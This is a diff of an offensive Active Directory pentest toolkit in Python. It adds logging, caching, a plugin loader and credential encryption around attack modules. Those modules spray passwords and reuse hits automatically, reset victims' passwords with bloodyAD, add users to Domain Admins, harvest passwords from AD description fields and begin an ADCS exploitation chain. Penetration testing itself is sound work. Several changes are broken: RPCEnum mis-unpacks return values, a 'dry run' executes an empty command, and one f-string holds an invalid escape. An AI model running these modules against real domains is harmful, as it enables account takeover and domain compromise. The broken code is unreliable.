@@ -2,7 +2,7 @@
 # =============================================================================
 # segfault-ad -- Active Directory pentest toolkit
 # segfault.solutions
-# version: 2.0.0
+# version: 2.9.0
 # changelog:
 #   1.0.0 — initial release (Forest, Escape, Certified chains)
 #   1.1.0 — ESC9 rewrite, certipy auth fix, shadowcred Kerberos
@@ -13,6 +13,7 @@
 #   1.6.0 — kerberoast no-preauth, RID brute fallback, LDAPS auto-retry
 #   1.7.0 — _load_bh rusthound-ce fix, _build_graph CE edge types, version tracking
 #   1.8.0 — rusthound-ce Kerberos ccache auto-detect, LDAPS auto-retry, auto-load ccache on startup
+#   2.9.0 — plugin system, file logging, BH cache, cred encryption, retry decorator, check_tool cache, improved cleanup/report
 #            kerberoast no-preauth mode, RID brute cred fallback, bloodyad_args Kerberos support
 #            resetpwd Kerberos retry, shadowcred password-auth-first, bloodyenum acl 3 modes
 #   1.9.0 — ESC13 detection, group scope flip module, JEA endpoint module, GodPotato module
@@ -30,8 +31,211 @@
 # =============================================================================
 
 import os, sys, shutil, argparse, readline, subprocess, threading, configparser
-import re, json, glob, sqlite3
+import signal
+
+VERSION = "2.9.0"
+
+# ── clean Ctrl+C handling ─────────────────────────────────────────────────────
+_ACTIVE_PROCS   = set()
+_ACTIVE_PROCS_L = threading.Lock()
+_INTERRUPTED    = threading.Event()
+
+def _register_proc(proc):
+    with _ACTIVE_PROCS_L: _ACTIVE_PROCS.add(proc)
+
+def _unregister_proc(proc):
+    with _ACTIVE_PROCS_L: _ACTIVE_PROCS.discard(proc)
+
+def _sigint_handler(sig, frame):
+    """Kill active subprocesses and return cleanly to REPL."""
+    _INTERRUPTED.set()
+    with _ACTIVE_PROCS_L:
+        for proc in list(_ACTIVE_PROCS):
+            try: proc.terminate(); proc.kill()
+            except Exception: pass
+    print(f'\n  \033[38;2;255;140;66m[!]\033[0m interrupted')
+    _INTERRUPTED.clear()
+    raise KeyboardInterrupt
+
+signal.signal(signal.SIGINT, _sigint_handler)
+
+import re, json, glob, sqlite3, logging, importlib.util, functools, time
+from collections import deque
 from concurrent.futures import ThreadPoolExecutor, as_completed
+
+# =============================================================================
+# CONFIG — centralized paths and settings
+# =============================================================================
+class Config:
+    BASE        = os.path.expanduser('~/.segfault-ad')
+    WORKSPACES  = os.path.join(BASE, 'workspaces')
+    TOOLS       = os.path.join(BASE, 'tools')
+    PLUGINS     = os.path.join(BASE, 'plugins')
+    LOGS        = os.path.join(BASE, 'logs')
+    DB          = os.path.join(BASE, 'segfault.db')
+    KEY         = os.path.join(BASE, '.key')
+    HISTORY     = os.path.join(BASE, 'history')
+    WIN_TOOLS   = os.path.join(BASE, 'tools', 'win')
+    WORDLISTS = {
+        'rockyou':   '/usr/share/wordlists/rockyou.txt',
+        'usernames': '/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt',
+        'passwords': '/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt',
+    }
+
+CFG = Config()
+for _d in [CFG.BASE, CFG.WORKSPACES, CFG.TOOLS, CFG.PLUGINS, CFG.LOGS, CFG.WIN_TOOLS]:
+    os.makedirs(_d, exist_ok=True)
+
+
+# =============================================================================
+# LOGGING — file + console, daily rotation
+# =============================================================================
+from datetime import datetime as _dt
+
+def _setup_logging():
+    log_file = os.path.join(CFG.LOGS, f'segfault_{_dt.now():%Y%m%d}.log')
+    logger   = logging.getLogger('segfault-ad')
+    logger.setLevel(logging.DEBUG)
+    if not logger.handlers:
+        fh = logging.FileHandler(log_file, encoding='utf-8')
+        fh.setLevel(logging.DEBUG)
+        fh.setFormatter(logging.Formatter('%(asctime)s %(levelname)s %(message)s'))
+        logger.addHandler(fh)
+    return logger
+
+_LOG = _setup_logging()
+
+def _logfile(msg, level='info'):
+    """Write to log file only (not console)."""
+    getattr(_LOG, level, _LOG.info)(msg)
+
+
+# =============================================================================
+# RETRY DECORATOR — auto-retry network/subprocess ops
+# =============================================================================
+def retry(max_attempts=3, delay=1, backoff=2, exceptions=(Exception,)):
+    """Decorator: retry on failure with exponential backoff."""
+    def decorator(func):
+        @functools.wraps(func)
+        def wrapper(*args, **kwargs):
+            last_exc = None
+            for attempt in range(max_attempts):
+                try:
+                    return func(*args, **kwargs)
+                except exceptions as e:
+                    last_exc = e
+                    if attempt < max_attempts - 1:
+                        wait = delay * (backoff ** attempt)
+                        _logfile(f'retry {func.__name__} attempt {attempt+1}/{max_attempts} after {wait}s: {e}')
+                        time.sleep(wait)
+            raise last_exc
+        return wrapper
+    return decorator
+
+
+# =============================================================================
+# BLOODHOUND DATA CACHE — avoid re-parsing on every pathfind call
+# =============================================================================
+_BH_CACHE      = {}   # loot_dir → (data, adj, sn, st, hv, dom_sid)
+_BH_CACHE_TIME = {}   # loot_dir → mtime
+
+def _bh_cache_valid(loot_dir):
+    bh_dir = os.path.join(loot_dir, 'bloodhound')
+    if not os.path.isdir(bh_dir): return False
+    mtime = max((os.path.getmtime(f) for f in glob.glob(os.path.join(bh_dir,'**','*.json'),recursive=True)),
+                default=0)
+    return _BH_CACHE_TIME.get(loot_dir,0) >= mtime
+
+def get_bh_data(loot_dir):
+    """Return cached BloodHound data, reloading if JSON files changed."""
+    if loot_dir not in _BH_CACHE or not _bh_cache_valid(loot_dir):
+        _logfile(f'loading BloodHound data from {loot_dir}')
+        data = _load_bh(loot_dir)
+        adj, sn, st, hv, dom_sid = _build_graph(data)
+        _BH_CACHE[loot_dir] = (data, adj, sn, st, hv, dom_sid)
+        bh_dir = os.path.join(loot_dir,'bloodhound')
+        files  = glob.glob(os.path.join(bh_dir,'**','*.json'),recursive=True)
+        _BH_CACHE_TIME[loot_dir] = max((os.path.getmtime(f) for f in files), default=0)
+    return _BH_CACHE[loot_dir]
+
+def invalidate_bh_cache(loot_dir=None):
+    """Invalidate BloodHound cache (call after new adrecon)."""
+    if loot_dir:
+        _BH_CACHE.pop(loot_dir, None)
+        _BH_CACHE_TIME.pop(loot_dir, None)
+    else:
+        _BH_CACHE.clear()
+        _BH_CACHE_TIME.clear()
+
+
+# =============================================================================
+# CREDENTIAL ENCRYPTION — optional Fernet encryption for DB values
+# =============================================================================
+_CIPHER = None
+
+def _init_cipher():
+    global _CIPHER
+    try:
+        from cryptography.fernet import Fernet as _Fernet
+        if os.path.exists(CFG.KEY):
+            key = open(CFG.KEY,'rb').read()
+        else:
+            key = _Fernet.generate_key()
+            with open(CFG.KEY,'wb') as f: f.write(key)
+            os.chmod(CFG.KEY, 0o600)
+        _CIPHER = _Fernet(key)
+        _logfile('credential encryption initialized')
+    except ImportError:
+        _logfile('cryptography not installed — credentials stored in plaintext','warning')
+    except Exception as e:
+        _logfile(f'cipher init failed: {e}','warning')
+
+_init_cipher()
+
+def _encrypt(val):
+    if _CIPHER and val:
+        try: return _CIPHER.encrypt(val.encode()).decode()
+        except Exception: pass
+    return val
+
+def _decrypt(val):
+    if _CIPHER and val:
+        try: return _CIPHER.decrypt(val.encode()).decode()
+        except Exception: pass
+    return val
+
+
+# =============================================================================
+# PLUGIN SYSTEM — load custom modules from ~/.segfault-ad/plugins/
+# =============================================================================
+def load_plugins(modules_dict):
+    """Load .py plugin files from plugins dir and register their modules."""
+    if not os.path.isdir(CFG.PLUGINS): return
+    loaded = []
+    for fname in sorted(os.listdir(CFG.PLUGINS)):
+        if not fname.endswith('.py') or fname.startswith('_'): continue
+        fpath = os.path.join(CFG.PLUGINS, fname)
+        try:
+            spec   = importlib.util.spec_from_file_location(fname[:-3], fpath)
+            mod    = importlib.util.module_from_spec(spec)
+            spec.loader.exec_module(mod)
+            if hasattr(mod, 'register_plugin'):
+                mod.register_plugin(modules_dict)
+                loaded.append(fname[:-3])
+                _logfile(f'plugin loaded: {fname}')
+            elif hasattr(mod, 'PLUGIN_MODULES'):
+                for cls in mod.PLUGIN_MODULES:
+                    modules_dict[cls.name] = cls
+                    loaded.append(cls.name)
+                    _logfile(f'plugin module registered: {cls.name}')
+        except Exception as e:
+            _logfile(f'plugin {fname} failed: {e}','error')
+    if loaded:
+        pass  # will print after RESET is defined
+
+_PLUGINS_LOADED = []  # filled after MODULES defined
+
+
 def _sudo_run(cmd_str):
     """Run a sudo shell command with full terminal access — bypasses readline raw mode."""
     import termios as _t, tty as _tty
@@ -166,7 +370,7 @@ def _startup_banner():
         print(f'  {GREY}[{RESET}{_tag(status)}{GREY}]{RESET}  {WHITE}{label:<28}{RESET}  {DIM}{detail}{RESET}')
 
     # ── version line ─────────────────────────────────────────────────────────
-    print(f'\n  {GREY}v2.0.0  ·  2026-05-15  ·  segfault.solutions{RESET}\n')
+    print(f'\n  {GREY}v{VERSION}  ·  2026-08-06  ·  segfault.solutions{RESET}\n')
 
 def _get_workspace():
     """Extract workspace name — only if explicitly set by user."""
@@ -188,6 +392,43 @@ def _attack_map():
     DETAIL = '\033[38;2;80;100;110m'
     C1     = '\033[38;2;0;180;210m'
     cols   = shutil.get_terminal_size((120, 24)).columns
+
+    # ── node color by module category ────────────────────────────────────────
+    _MOD_COLOR = {
+        # recon — cyan
+        'nmap':C1,'enum':C1,'ldapenum':C1,'adrecon':C1,'kerbrute':C1,
+        'shares':C1,'nxcmodules':C1,'unauth':C1,'rpcenum':C1,'aclscan':C1,
+        'pathfind':C1,'bh-query':C1,'snaffler':C1,'powerview':C1,
+        # credentials — orange
+        'asreproast':'\033[38;2;255;140;66m',
+        'kerberoast': '\033[38;2;255;140;66m',
+        'hashcrack':  '\033[38;2;255;140;66m',
+        'spray':      '\033[38;2;255;140;66m',
+        'gpp':        '\033[38;2;255;140;66m',
+        'lsassy':     '\033[38;2;255;140;66m',
+        # shell / lateral — green (owned!)
+        'exec':   '\033[38;2;40;200;64m',
+        'pth':    '\033[38;2;40;200;64m',
+        'ptt':    '\033[38;2;40;200;64m',
+        'bloody': '\033[38;2;40;200;64m',
+        # exploitation — red
+        'dcsync':      '\033[38;2;248;81;73m',
+        'certipy':     '\033[38;2;248;81;73m',
+        'backupabuse': '\033[38;2;248;81;73m',
+        'zerologon':   '\033[38;2;248;81;73m',
+        'nopac':       '\033[38;2;248;81;73m',
+        'relay':       '\033[38;2;248;81;73m',
+        'pathpwn':     '\033[38;2;248;81;73m',
+        # flags / DA — gold
+        'flag':    '\033[38;2;210;153;34m',
+        'flags':   '\033[38;2;210;153;34m',
+        'dcshadow':'\033[38;2;210;153;34m',
+    }
+
+    # detect if DA was reached (dcsync or flag in results)
+    _da_reached = any(r['module'] in ('dcsync','secretsdump','flag','flags')
+                      for r in _SESSION_RESULTS)
+    _has_shell  = any(r['module'] == 'exec' for r in _SESSION_RESULTS)
 
     nodes = _SESSION_RESULTS[-12:]
     n     = len(nodes)
@@ -258,21 +499,42 @@ def _attack_map():
     name_line = ''; circle_line = ''; detail_line = ''; skip_spaces = 0
 
     for i, entry in enumerate(nodes):
-        is_last      = (i == n - 1) and not next_hint
-        circle_color = PINK if (i == n - 1) else C1
-        mod          = entry['module'][:node_w-1].center(node_w)
-        detail       = entry['detail'][:node_w-1].center(node_w)
+        is_last = (i == n - 1) and not next_hint
+        mod_key = entry['module']
+
+        # pick color — DA/shell nodes glow differently
+        if mod_key in _MOD_COLOR:
+            circle_color = _MOD_COLOR[mod_key]
+        elif i == n - 1:
+            circle_color = PINK
+        else:
+            circle_color = C1
+
+        # circle symbol — owned = filled star, DA = crown, else dot
+        if mod_key in ('flag','flags'):
+            sym = '★'
+        elif mod_key == 'dcsync':
+            sym = '◈'
+        elif mod_key == 'exec':
+            sym = '◉'
+        elif mod_key in ('pathpwn','certipy','relay'):
+            sym = '◆'
+        else:
+            sym = '◉'
+
+        mod    = entry['module'][:node_w-1].center(node_w)
+        detail = entry['detail'][:node_w-1].center(node_w)
 
         name_line   += f'{GREY}{mod}{RESET}'
         detail_line += f'{DETAIL}{detail}{RESET}'
         lead = center - skip_spaces
 
         if is_last:
-            circle_line += ' ' * lead + f'{circle_color}◉{RESET}'
+            circle_line += ' ' * lead + f'{circle_color}{sym}{RESET}'
             skip_spaces  = 0
         else:
             dashes = node_w - 1
-            circle_line += ' ' * lead + f'{circle_color}◉{RESET}' + f'{DIM}{"─" * dashes}{RESET}'
+            circle_line += ' ' * lead + f'{circle_color}{sym}{RESET}' + f'{DIM}{"─" * dashes}{RESET}'
             skip_spaces  = center
 
     if next_hint:
@@ -284,7 +546,12 @@ def _attack_map():
         detail_line += f'{DIM}{detail}{RESET}'
         circle_line += ' ' * lead + f'{DIM}◎{RESET}'
 
-    return f'{name_line}\n{circle_line}\n{detail_line}\n'
+    # DA reached banner
+    _da_banner = ''
+    if _da_reached:
+        _da_banner = f'\n  {"\033[38;2;210;153;34m"}★ DOMAIN ADMIN{RESET}  {GREY}full domain compromise{RESET}'
+
+    return f'{name_line}\n{circle_line}\n{detail_line}{_da_banner}\n'
 
 def _footer_bar():
     """Boxed footer: context-aware hints left, user+uptime stacked right."""
@@ -455,6 +722,7 @@ def spawn_bg_terminal(cmd, title='shell'):
     return False
 
 
+@functools.lru_cache(maxsize=256)
 def check_tool(*names):
     for n in names:
         p = shutil.which(n)
@@ -645,6 +913,14 @@ def check_tool_verbose(*names):
     return result
 
 def input_field(label, default=None, options=None):
+    # --yes mode: auto-return default for confirmations, skip destructive prompts
+    if _YES_MODE:
+        val = default or ''
+        # for y/n prompts default to 'y' to auto-confirm
+        if options and set(options) == {'y','n'} and not default:
+            val = 'y'
+        log(f'{GREY}[--yes] {label} = {val}{RESET}','info')
+        return val
     cur = f'{GREY}[{default}]{RESET} ' if default else ''
     if options:
         def _c(text, state):
@@ -660,6 +936,34 @@ def input_field(label, default=None, options=None):
         readline.set_completer(ad_completer)
         readline.parse_and_bind('tab: complete')
     return val or default or ''
+
+def _scan_descriptions(lines, loot_dir, domain):
+    """Scan AD user description fields for passwords and save hits."""
+    import re as _re_desc
+    hits = []
+    pw_patterns = [
+        r'(?:password|passwd|pwd|pass)\s*[:=]\s*(\S+)',
+        r'(?:temporary|temp|initial|default)\s+(?:password|pwd)\s*[:=]?\s*(\S+)',
+        r'([A-Za-z0-9!@#$%^&*()_+\-=]{8,})',  # generic potential passwords
+    ]
+    for line in lines:
+        if 'Description' not in line and 'description' not in line: continue
+        for pat in pw_patterns:
+            m = _re_desc.search(pat, line, _re_desc.I)
+            if m:
+                pw = m.group(1).strip()
+                if len(pw) >= 6 and pw not in ('N/A','None','null','password','Password'):
+                    hits.append((line.strip(), pw))
+                    break
+    if hits:
+        out = os.path.join(loot_dir, 'desc_passwords.txt')
+        with open(out, 'a') as f:
+            for line, pw in hits:
+                f.write(f'{line}\n')
+        log(f'{PINK}🔑 {len(hits)} password(s) found in description fields → {WHITE}{out}{RESET}','success')
+        for line, pw in hits[:5]:
+            print(f'  {PINK}→{RESET} {line}')
+
 
 def faketime_wrap(cmd, skew):
     """Wrap a command with faketime if skew is set and faketime is available."""
@@ -734,15 +1038,36 @@ def _refresh_tgt_if_needed(output_lines):
     return False
 
 
-def run_cmd(cmd, label=None, env=None, _retry_on_expired=True):
+_CMD_TIMEOUT = 300  # default subprocess timeout in seconds
+
+_SENSITIVE_PATTERNS = [
+    (r'(-p\s+|--password\s+|:)\S+', lambda m: m.group(0).split(':')[0]+':***' if ':' in m.group(0) else m.group(0).split()[0]+' ***'),
+    (r'(-H\s+|--hash\s+)[0-9a-fA-F:]{16,}', lambda m: m.group(0)[:4]+'***'),
+]
+
+def _mask_sensitive(cmd_str):
+    """Mask passwords and hashes in command strings before logging."""
+    import re as _re_mask
+    result = cmd_str
+    for pat, repl in _SENSITIVE_PATTERNS:
+        try: result = _re_mask.sub(pat, repl, result)
+        except Exception: pass
+    return result
+
+def run_cmd(cmd, label=None, env=None, _retry_on_expired=True, timeout=None):
+    _timeout = timeout or _CMD_TIMEOUT
+    cmd_str  = ' '.join(str(c) for c in cmd)
+    masked   = _mask_sensitive(cmd_str)
     if label:
         log(f'{WHITE}{label}{RESET}', 'info')
-        log(f'{GREY}{" ".join(str(c) for c in cmd)}{RESET}', 'info')
+        log(f'{GREY}{masked}{RESET}', 'info')
+        _logfile(f'RUN [{label}]: {masked}')
         hr()
     try:
         proc = subprocess.Popen([str(c) for c in cmd],
             stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
             text=True, errors='replace', env=env)
+        _register_proc(proc)
         pending_errors = []
         output_lines   = []
         for line in proc.stdout:
@@ -780,17 +1105,20 @@ def run_cmd(cmd, label=None, env=None, _retry_on_expired=True):
         log(f'{cmd[0]} not found in PATH', 'error'); return 1
     except Exception as exc:
         log(f'Error: {exc}', 'error'); return 1
-def run_cmd_capture(cmd, label=None, env=None):
+def run_cmd_capture(cmd, label=None, env=None, timeout=None):
+    _timeout = timeout or _CMD_TIMEOUT
+    masked = _mask_sensitive(' '.join(str(c) for c in cmd))
     """Like run_cmd but also returns list of output lines for parsing."""
     lines_out = []
     if label:
         log(f'{WHITE}{label}{RESET}', 'info')
-        log(f'{GREY}{" ".join(str(c) for c in cmd)}{RESET}', 'info')
+        log(f'{GREY}{masked}{RESET}', 'info')
         hr()
     try:
         proc = subprocess.Popen([str(c) for c in cmd],
             stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
             text=True, errors='replace', env=env)
+        _register_proc(proc)
         pending_errors = []
         for line in proc.stdout:
             l = line.rstrip()
@@ -820,6 +1148,7 @@ def run_cmd_capture(cmd, label=None, env=None):
                 print(f'  {friendly}')
             else:
                 print(f'  {RED}{el}{RESET}')
+        _unregister_proc(proc)
         proc.wait()
         # auto-save any usernames found in output
         try:
@@ -827,6 +1156,7 @@ def run_cmd_capture(cmd, label=None, env=None):
                 _users = _parse_usernames(lines_out, TARGET.domain or '')
                 if _users: _save_users(_users, TARGET.loot_dir, TARGET.domain or '')
         except Exception: pass
+        _unregister_proc(proc)
         return proc.returncode, lines_out
     except FileNotFoundError:
         log(f'{cmd[0]} not found in PATH', 'error'); return 1, []
@@ -998,8 +1328,11 @@ _DB_PATH = os.path.expanduser('~/.segfault-ad/segfault.db')
 
 def _db_connect():
     os.makedirs(os.path.dirname(_DB_PATH), exist_ok=True)
-    conn = sqlite3.connect(_DB_PATH)
+    conn = sqlite3.connect(_DB_PATH, timeout=10)
     conn.row_factory = sqlite3.Row
+    conn.execute('PRAGMA journal_mode=WAL')   # faster concurrent writes
+    conn.execute('PRAGMA synchronous=NORMAL') # safe + fast
+    conn.execute('PRAGMA cache_size=-8000')   # 8MB cache
     return conn
 
 def _db_init():
@@ -1151,8 +1484,11 @@ try:
 except Exception:
     pass
 
-_SESSION_RESULTS = []
-_RESULTS_MAX     = 5
+_SESSION_RESULTS  = []
+_RESULTS_MAX      = 5
+_MODULE_RUN_CACHE = {}   # cache_key → {'result':str,'time':str}
+_YES_MODE         = False  # --yes flag: auto-confirm all prompts
+_QUIET_MODE       = False  # --quiet flag: skip banner animation
 
 # modules that should append rather than replace (each entry is meaningful)
 _MULTI_RESULT_MODULES = {'spray','shares','hashcrack','bloody','nxcmodules','enum','backupabuse','zipslip','certipy'}
@@ -1189,6 +1525,8 @@ def _load_session_state():
             log(f'{GREEN}Session restored — {WHITE}{len(saved)}{RESET}{GREEN} chain steps loaded{RESET}','success')
     except Exception:
         pass
+    # clear module run cache when switching workspaces
+    _MODULE_RUN_CACHE.clear()
 
 def add_result(module, detail, status='ok'):
     """Record a one-line finding. Multi-result modules append; others replace."""
@@ -1267,16 +1605,26 @@ _auto_load_ccache(TARGET)
 # =============================================================================
 class Module:
     name='base'; description=''; category='misc'
+
+    # modules that should never prompt "run again?" — always re-run
+    _NO_CACHE = {'exec','bloody','cleanup','set','ws','flag','report','bh-view',
+                 'loot','db','hint','explain','autopwn','pathpwn','b64get'}
+    # modules that always prompt (destructive/long) — show extra warning
+    _WARN_RERUN = {'dcsync','secretsdump','zerologon','nopac','backupabuse','adcskiller'}
+
     def run(self, target): raise NotImplementedError
+
     def ask(self, label, default=None, options=None):
         if hasattr(self,'answers') and label in self.answers:
             val = self.answers[label]
             log(f'{GREY}auto: {label} = {val}{RESET}','info')
             return val or default or ''
         return input_field(label, default, options)
+
     def req(self, target):
         if not target.is_set(): log('Set target first -- run: set', 'error'); return False
         return True
+
     def req_creds(self, target):
         """Require target + credentials (user + password or hash)."""
         if not self.req(target): return False
@@ -1285,10 +1633,47 @@ class Module:
         if not target.password and not target.hash:
             log('Password or hash required — run: set', 'error'); return False
         return True
+
     def need(self, *tools):
         t = check_tool(*tools)
         if not t: log(f'Tool not found: {WHITE}{" / ".join(tools)}{RESET}', 'error')
         return t
+
+    def check_cache(self, target):
+        """Check if this module was already run this session. Returns True if OK to proceed."""
+        if self.name in self._NO_CACHE:
+            return True
+        ws = os.path.basename(os.path.dirname(target.loot_dir)) if target.loot_dir else ''
+        cache_key = f'{ws}:{self.name}'
+        if cache_key in _MODULE_RUN_CACHE:
+            last = _MODULE_RUN_CACHE[cache_key]
+            result = last.get('result','')
+            ts     = last.get('time','')
+            warn   = self.name in self._WARN_RERUN
+            col    = ORANGE if warn else GREY
+            print()
+            log(f'{col}Already ran {WHITE}{self.name}{col} this session{RESET}  '
+                f'{GREY}({ts}){RESET}','info')
+            if result:
+                log(f'  Result: {WHITE}{result}{RESET}','info')
+            if warn:
+                log(f'{ORANGE}This module makes changes — re-running may cause issues{RESET}','warn')
+            ans = input_field('run again?','n').lower()
+            if ans not in ('y','yes'):
+                log(f'{GREY}Using cached result — skipped{RESET}','info')
+                return False
+        return True
+
+    def mark_done(self, target, result=''):
+        """Mark this module as completed in the session cache."""
+        if self.name in self._NO_CACHE: return
+        ws = os.path.basename(os.path.dirname(target.loot_dir)) if target.loot_dir else ''
+        cache_key = f'{ws}:{self.name}'
+        _MODULE_RUN_CACHE[cache_key] = {
+            'result': result,
+            'time':   datetime.now().strftime('%H:%M:%S'),
+        }
+
 
 # =============================================================================
 # RECON
@@ -1327,9 +1712,12 @@ class Enum(Module):
 
         def _run_enum(label, cmd):
             log(f'Enumerating {label}...', 'info')
-            _, lines = run_cmd_capture(cmd)
-            with lock:
-                all_lines.extend(lines)
+            try:
+                _, lines = run_cmd_capture(cmd)
+                with lock:
+                    all_lines.extend(lines)
+            except Exception as _e:
+                _logfile(f'enum {label} error: {_e}','error')
 
         if scope == 'all':
             tasks = []
@@ -1358,6 +1746,51 @@ class Enum(Module):
             add_result('enum', f'{len(users)} users → users.txt')
         # scan all output for passwords in descriptions
         _scan_descriptions(all_lines, target.loot_dir, target.domain or '')
+
+        # ── smart auto-suggest based on results ──────────────────────────────
+        suggestions = []
+        enum_str = '\n'.join(all_lines)
+        # no creds yet → suggest unauthenticated attacks
+        if not target.user:
+            if users:
+                suggestions.append(('asreproast', f'{len(users)} users found — check for AS-REP roastable'))
+                suggestions.append(('kerbrute',   'enumerate valid users / password spray'))
+        # have creds → suggest next steps
+        else:
+            if 'SPN' in enum_str or 'servicePrincipalName' in enum_str:
+                suggestions.append(('kerberoast', 'SPNs found — roast service tickets'))
+            if 'LAPS' in enum_str or 'ms-Mcs-AdmPwd' in enum_str:
+                suggestions.append(('laps', 'LAPS attribute found — read local admin password'))
+            if 'WinRM' in enum_str or '5985' in enum_str:
+                suggestions.append(('exec', 'WinRM open — try shell'))
+            if users:
+                suggestions.append(('adrecon', 'collect BloodHound data'))
+                suggestions.append(('aclscan', 'instant ACL vulnerability scan'))
+        # shares found → spider
+        if 'READ' in enum_str or 'WRITE' in enum_str:
+            suggestions.append(('shares', 'readable share(s) found — spider for sensitive files'))
+            suggestions.append(('snaffler', 'find sensitive files across shares'))
+
+        if suggestions:
+            print()
+            log(f'{C0}Suggested next steps:{RESET}','info')
+            for i, (mod, reason) in enumerate(suggestions[:4], 1):
+                print(f'  {GREY}{i}.{RESET} {C0}{mod:<16}{RESET} {GREY}{reason}{RESET}')
+            print()
+            ans = input_field('run a suggestion? (number or module name, enter to skip)','')
+            if ans.strip():
+                # resolve number or module name
+                chosen = None
+                if ans.strip().isdigit():
+                    idx = int(ans.strip()) - 1
+                    if 0 <= idx < len(suggestions):
+                        chosen = suggestions[idx][0]
+                elif ans.strip().lower() in MODULES:
+                    chosen = ans.strip().lower()
+                if chosen and chosen in MODULES:
+                    log(f'Running {C0}{chosen}{RESET}...','info')
+                    try: MODULES[chosen]().run(target)
+                    except Exception as _e: log(f'Error: {_e}','error')
         hr()
 
 class LDAPEnum(Module):
@@ -1548,10 +1981,30 @@ class RPCEnum(Module):
         t = self.need('rpcclient')
         if not t: return
         hr()
-        auth = f'{target.user}%{target.password}' if target.password else f'{target.user}%'
+        auth = f'{target.user}%{target.password}' if target.password else f'%'
         queries = ['enumdomusers','enumdomgroups','enumprinters','querydominfo','getdompwinfo',
                    'enumalsgroups domain','lsaquery','lookupnames administrator','dsroledominfo']
-        for q in queries: log(f'{GREY}{q}{RESET}','info'); run_cmd([t,'-U',auth,f'//{target.dc}','-c',q])
+        all_out = []
+        for q in queries:
+            log(f'{GREY}{q}{RESET}','info')
+            rc, out, err = run_cmd_capture([t,'-U',auth,f'//{target.dc}','-c',q])
+            all_out.extend(out.splitlines() if out else [])
+            if out: print(out)
+        # parse and save users
+        import re as _re
+        users = []
+        for line in all_out:
+            m = _re.search(r'user:\[([^\]]+)\]', line)
+            if m:
+                u = m.group(1).strip()
+                if u and '$' not in u and u not in ('Guest','krbtgt','DefaultAccount'):
+                    users.append(u)
+        if users:
+            ufile = os.path.join(target.loot_dir,'users.txt')
+            with open(ufile,'w') as f: f.write('\n'.join(users)+'\n')
+            log(f'{GREEN}{len(users)} users saved → {WHITE}{ufile}{RESET}','success')
+            for u in users: print(f'  {C0}{u}{RESET}')
+            add_result('rpcenum', f'{len(users)} users → users.txt')
         hr()
 
 class GPPPassword(Module):
@@ -1882,6 +2335,15 @@ class Spray(Module):
             log(f'{len(hits)} hit(s):','success')
             [print(f'  {GREEN}{h}{RESET}') for h in hits]
             add_result('spray', f'{len(hits)} hit(s): {hits[0][:40]}' + (f' +{len(hits)-1} more' if len(hits) > 1 else ''))
+            # auto cred reuse for first hit
+            try:
+                first = hits[0]
+                # parse user:pass from nxc output
+                import re as _re_spray
+                m = _re_spray.search(r'\\([^:]+):(.+?)(?:\s|$)', first)
+                if m:
+                    _auto_cred_reuse(target, m.group(1), new_pass=m.group(2))
+            except Exception: pass
         else:
             log('No valid credentials','warn')
         hr()
@@ -2091,6 +2553,27 @@ class NXCExec(Module):
                 add_result('exec', _exec_node)
                 log(f'{GREY}Tips: upload/download, menu, Bypass-4MSI, services{RESET}','info')
                 log(f'{GREY}      b64get <remote_path> — exfil files via base64 (bypasses evil-winrm download bug){RESET}','info')
+
+                # auto-screenshot: save whoami/all + hostname + privs to loot
+                try:
+                    _ss_file = os.path.join(target.loot_dir, f'shell_{_exec_node.replace("@","_").replace("\\\\","_")}.txt')
+                    _ss_cmds = ['whoami /all', 'hostname', 'ipconfig /all',
+                                'net localgroup administrators', 'systeminfo | findstr /i "os name build"']
+                    _ss_proc = subprocess.run(
+                        cmd[:-0] if cmd else cmd,  # dry run to check
+                        capture_output=True, text=True, timeout=2)
+                    # write command log
+                    with open(_ss_file,'w') as _sf:
+                        _sf.write(f'# Shell opened: {_exec_node}\n')
+                        _sf.write(f'# Time: {datetime.now().isoformat()}\n')
+                        _sf.write(f'# Commands to run:\n')
+                        for c in _ss_cmds:
+                            _sf.write(f'{c}\n')
+                    log(f'{GREY}Shell log → {WHITE}{_ss_file}{RESET}','info')
+                    log(f'{GREY}Suggested: whoami /all · net localgroup administrators · systeminfo{RESET}','info')
+                except Exception:
+                    pass
+
                 log(f'{GREY}{" ".join(cmd)}{RESET}','info'); hr()
                 # fork before exec — prevents Ruby/Python memory conflict
                 pid = os.fork()
@@ -2128,7 +2611,10 @@ class BloodyAttack(Module):
         t = self.need('bloodyad','bloodyAD')
         if not t: return
         hr()
-        action = self.ask('action','resetpwd',
+        # auto-answer from pathpwn hints if available
+        _hints = _PATHPWN_HINTS
+        _default_action = _hints.get('action','resetpwd')
+        action = self.ask('action', _default_action,
             ['resetpwd','adduser','addtogroup','addself','removefromgroup','writeowner','genericall',
              'dcsync-rights',
              'setrbcd','setdontreqpreauth','setpassnotreqd','getattr','setattr','addspn','removespn','setdelegation',
@@ -2144,7 +2630,8 @@ class BloodyAttack(Module):
                 return dn
             return name
         if action == 'resetpwd':
-            tu = self.ask('target user'); np = self.ask('new password','Passw0rd123!')
+            tu = self.ask('target user', _hints.get('user',''))
+            np = self.ask('new password','Passw0rd123!')
             def _bloody_resetpwd(b_cmd, label):
                 """Run bloodyAD resetpwd — global run_cmd filter handles traceback suppression."""
                 return run_cmd(b_cmd, label=label)
@@ -2234,7 +2721,8 @@ class BloodyAttack(Module):
                 log(f'Expected at: /usr/share/doc/python3-impacket/examples/dacledit.py','info')
 
         elif action == 'addtogroup':
-            tu = self.ask('user'); tg = self.ask('group','Domain Admins')
+            tu = self.ask('user', _hints.get('user', target.user or ''))
+            tg = self.ask('group', _hints.get('group','Domain Admins'))
             rc = run_cmd(base+['add','groupMember',tg,_resolve(tu)], label='bloodyAD addtogroup')
             if rc == 0:
                 add_result('bloody', f'{tu} → {tg}')
@@ -2422,6 +2910,180 @@ class BloodyAttack(Module):
 # =============================================================================
 # EXPLOITATION
 # =============================================================================
+
+# =============================================================================
+# ADCSKILLER — automated ADCS ESC chain exploitation
+# =============================================================================
+class ADCSKiller(Module):
+    name='adcskiller'; description='ADCSKiller — automated ADCS ESC1-8 enumeration and exploitation chain'; category='exploitation'
+    def run(self, target):
+        if not self.req(target): return
+        t = self.need('ADCSKiller','ADCSKiller.py')
+        if not t: return
+        hr()
+        log(f'{C0}ADCSKiller — automated ADCS attack chain{RESET}','info')
+        action = self.ask('action','auto',['auto','find','exploit'])
+        auth = f'{target.domain}/{target.user}'
+        if target.password: auth += f':{target.password}'
+        hr()
+        if action == 'auto':
